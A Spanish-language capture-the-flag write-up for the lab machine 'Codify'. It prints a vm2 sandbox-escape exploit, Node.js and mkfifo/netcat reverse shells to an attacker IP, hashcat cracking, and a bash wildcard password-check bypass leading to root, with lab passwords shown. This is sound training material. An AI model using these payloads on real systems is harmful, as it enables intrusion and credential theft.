# Codify

![](../../../../~gitbook/image.md)Publicado: 15 de Mayo de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
### 📝 Descripción
Codify es una máquina Linux de dificultad fácil que aloja una aplicación web que permite a los usuarios ejecutar código Node.js en un entorno sandbox. La vulnerabilidad principal se encuentra en la versión desactualizada de la librería vm2 (v3.9.16) utilizada para implementar el sandbox, la cual permite escapar de las restricciones y ejecutar comandos en el sistema operativo subyacente. La escalada de privilegios se logra aprovechando un script de backup de MySQL al que el usuario comprometido tiene acceso sudo, explotando una vulnerabilidad en la validación de contraseñas que permite obtener credenciales de root.Este laboratorio presenta un recorrido educativo sobre vulnerabilidades en ambientes sandbox, explotación de aplicaciones web Node.js y técnicas de escalada de privilegios en sistemas Linux a través de scripts con validaciones insuficientes.
### 🔭 Reconocimiento

#### Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
#### Escaneo de puertos

#### Enumeración de servicios
⚠️ Importante: Detectamos durante la fase de enumeración con nmap que se está realizando virtual hosting. Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
### 🌐 Enumeración Web

#### 80 HTTP
http://codify.htb/![](../../../../~gitbook/image.md)Enontramos una aplicación que permite probar Node.js dentro de un sanbox:![](../../../../~gitbook/image.md)Aunque una sección ya nos avisa de que hay algunas limitaciones:![](../../../../~gitbook/image.md)También enumeramos la librería que están empleando para crear el sandbox:![](../../../../~gitbook/image.md)Usamos el siguiente payload para intentar escapar del sandboxPero nos encontramos con una de las limitaciones:![](../../../../~gitbook/image.md)Volviendo a la versión de la librería vm2 que se está utilizando para el sandbox:
https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
### 💻 Explotación
Existe una vulnerabilidad en la desinfección de excepciones de vm2 para versiones hasta 3.9.16, que permite a los atacantes generar una excepción de host no desinfectada dentro de handleException() que se puede usar para escapar del entorno protegido y ejecutar código arbitrario en el contexto del host.Usaremos el siguiente exploit
https://www.exploit-db.com/exploits/51898Verificamos que la PoC funciona correctamente:![](../../../../~gitbook/image.md)Si reemplazamos el comando por una shell basada en FIFO:Iniciamos previamente el listener en nuestro host de ataque:Ganamos acceso a la máquina:![](../../../../~gitbook/image.md)
#### Mejora de la shell

#### Foothold
Enumerando la máquina encontramos un fichero de base de datos que contiene un hash de tipo bcrypt del usuario joshua:![](../../../../~gitbook/image.md)Confirmamos que es un hash de tipo bcrypt:![](../../../../~gitbook/image.md)Intentamos crackearlo usando hashcat y rockyouObtenemos con éxito la contraseña `spongebob1` para el usuario joshua.![](../../../../~gitbook/image.md)Nos autenticamos como joshua en el host comprometido y obtenemos la flag:
#### 👑 Escalada de privilegios
Verificamos ahora si joshua puede ejecutar algún comando, script o binario como root:Echamos un ojo al contenido del scriptVemos que el script lo que hace es crear una copia de seguridad de la base de datos, para ello define el usuario que va a utilizar para la conexión (en este caso root) y lee la contraseña del directorio /root/.creds.A continuación pide una contraseña al usuario y la compara con la la que hay almacenada en el directorio /root/.creds. SI es correcta crea un archivo llamado mysql directorio en /var/backups/A continuación se conecta a la base de datos y crea un backup para cada una de las bases de datos.Lo más relevante de este script y por donde puede venir nuestro vector de ataque, es que no se está sanitizando el parámetro DB_PASS introducido por el usuario, simplemente se realiza una comparación y en caso de no ser iguales sale del script, pero y si buscamos la forma de que no se evalúe esa condición, por ejemplo mediante la introducción de algún carácter especial como: `* ? [` podremos hacer que rompa la condición y el script continúe y se complete realizando el backup:En este caso introducimos un wildcard o asterisco como contraseña y vemos que logramos eludir la comprobación de la contraseña y crear el backupNuestro éxito es efímero ya que descubrimos que el usuario joshua no tiene permisos para leer el contenido de /var/backups/mysql![](../../../../~gitbook/image.md)Otra cosa que podríamos hacer es que una vez que ya ha pasado la validación y usa la variable DB_PASS para conectarse a la base de datos, intentar ver su valor. Para ello podríamos usar la herramienta pspy:Descargamos el binarioLo transferimos al host comprometidoA continuación lo ejecutamos![](../../../../~gitbook/image.md)A continuación desde la otra terminal lanzamos el script volviendo a introducir como contraseña el carácter especial * :Y en la terminal de pspy deberemos ver el contenido de la variable DB_PASS![](../../../../~gitbook/image.md)Verificamos que está reutilizando la contraseña para el usuario root de la máquina y capturamos la flag:Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)
- [💻 Explotación](#explotacion)

```
❯  ping -c2 10.10.11.239
PING 10.10.11.239 (10.10.11.239) 56(84) bytes of data.
64 bytes from 10.10.11.239: icmp_seq=1 ttl=63 time=47.9 ms
64 bytes from 10.10.11.239: icmp_seq=2 ttl=63 time=47.6 ms

--- 10.10.11.239 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 47.642/47.763/47.885/0.121 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.239 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
22,80,3000
```

```
nmap -sC -sV -p$ports 10.10.11.230 -oN services.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-12 11:54 CEST
Nmap scan report for 10.10.11.28
Host is up (0.048s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds

```

```
echo "10.10.11.239 codify.htb/" | sudo tee -a /etc/hosts
```

```
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(4444, "10.10.14.14", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();
```

```
const { VM } = require("vm2");
const vm = new VM();

const command = 'pwd'; // Change to the desired command

const code = `
async function fn() {
(function stack() {
new Error().stack;
stack();
})();
}

try {
const handler = {
getPrototypeOf(target) {
(function stack() {
new Error().stack;
stack();
})();
}
};

const proxiedErr = new Proxy({}, handler);

throw proxiedErr;
} catch ({ constructor: c }) {
const childProcess = c.constructor('return process')().mainModule.require('child_process');
childProcess.execSync('${command}');
}
`;

console.log(vm.run(code));
```

```
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.14 1337 > /tmp/f
```

```
nc -nlvp 1337
```

```
script /dev/null -c bash

CTRL + Z

stty raw echo; fg
reset xterm

export TERM=xterm
```

```
hashcat -m 3200 joshua_hash /usr/share/wordlists/rockyou.txt
```

```
su joshua
spongebob1
```

```
svc@codify:/var/www/contact$ su joshua
Password:
joshua@codify:/var/www/contact$ whoami
joshua
joshua@codify:/var/www/contact$ cd /home/joshua
joshua@codify:~$ cat user.txt
```

```
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Sorry, try again.
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty

User joshua may run the following commands on codify:
(root) /opt/scripts/mysql-backup.sh
joshua@codify:~$
```

```
# !/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
/usr/bin/echo "Password confirmed!"
else
/usr/bin/echo "Password confirmation failed!"
exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
/usr/bin/echo "Backing up database: $db"
/usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

```
joshua@codify:/opt/scripts$ sudo /opt/scripts/mysql-backup.sh

Enter MySQL password for root: *
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
joshua@codify:/opt/scripts$
```

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
```

```
python3 -m http.server 80
ssh joshua@10.10.11.239
cd /tmp
wget http://10.10.14.14/pspy64s
chmod +x pspy64s
```

```
./pspy64s -i 1
```

```
sudo /opt/scripts/mysql-backup.sh
[sudo] password for joshua:
Enter MySQL password for root: *
Password confirmed!
```

```
joshua@codify:/opt/scripts$ su root
Password: kljh12k3jhaskjh12kjh3
root@codify:/opt/scripts# id
uid=0(root) gid=0(root) groups=0(root)
root@codify:/opt/scripts# cat /root/root.txt
```
